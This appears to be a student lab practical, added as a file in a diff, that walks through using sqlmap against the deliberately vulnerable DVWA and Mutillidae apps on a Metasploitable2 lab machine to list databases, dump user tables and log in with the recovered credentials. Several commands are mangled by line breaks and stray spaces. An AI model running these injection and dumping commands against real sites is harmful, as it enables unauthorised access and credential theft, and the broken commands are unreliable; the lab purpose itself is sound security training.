@@ -1,0 +1,67 @@
+prac7
+
+Run metasploitable2 and Kali Linux and check the Ip address of metasploitable2
+
+Type the metasploitable2 ip address on the browser
+
+Select the Mutillidae option
+
+sqlmap -h
+
+#DVWA
+sqlmap -u ‘the link of the login page’ –dbs –dump --batch
+
+Type Y for all the Questions.
+It will take quite a while for the process to complete as it is checking the vulnerabilities 
+You will get the following error(WARNING).
+
+sudo nano /var/www/Mutillidae/config.inc
+change the “dbname” to owasp10
+
+sqlmap -u 
+'http://192.168.37.130/mutillidae/index.php?page=userinfo.php&username=admin&p 
+assword=password&user-info-php-submit-button=View+Account+Details' --dbs
+
+sqlmap -u 
+'http://192.168.37.130/mutillidae/index.php?page=userinfo.php&username=admin&p 
+assword=password&user-info-php-submit-button=View+Account+Details' -D dvwa - -
+tables
+
+Select the ‘0’ Injection point to view the tables
+
+sqlmap -u 
+'http://192.168.37.130/mutillidae/index.php?page=userinfo.php&username=admin&p 
+assword=password&user-info-php-submit-button=View+Account+Details' -D dvwa - T users 
+--columns
+
+sqlmap -u 
+'http://192.168.37.130/mutillidae/index.php?page=userinfo.php&username=admin&p 
+assword=password&user-info-php-submit-button=View+Account+Details' -D dvwa - T users 
+--dump
+
+you can see all the 
+passwords for every user that is present in the DVWA database
+
+Enter one of the cracked username and passwords on the DVWA website and you will be 
+able to log in
+
+After entering the cracked credentials, you should have access to the main page of the 
+DVWA website
+
+#Mutillidae
+Evaluate the same SQL Injection with the Mutillidae website
+
+sqlmap -u 'http://192.168.37.130/mutillidae/index.php?page=userinfo.php&username=admin& 
+password=password&user-info-php-submit-button=View+Account+Details' --dbs
+
+sqlmap -u 
+'http://192.168.37.130/mutillidae/index.php?page=userinfo.php&username=admin&p 
+assword=password&user-info-php-submit-button=View+Account+Details' -D owasp10 -T 
+accounts --dump
+
+we can see all the cracked passwords of every user mentioned in the accounts table
+
+Now we will use one of these credentials, to log into the Mutillidae website
+
+
+
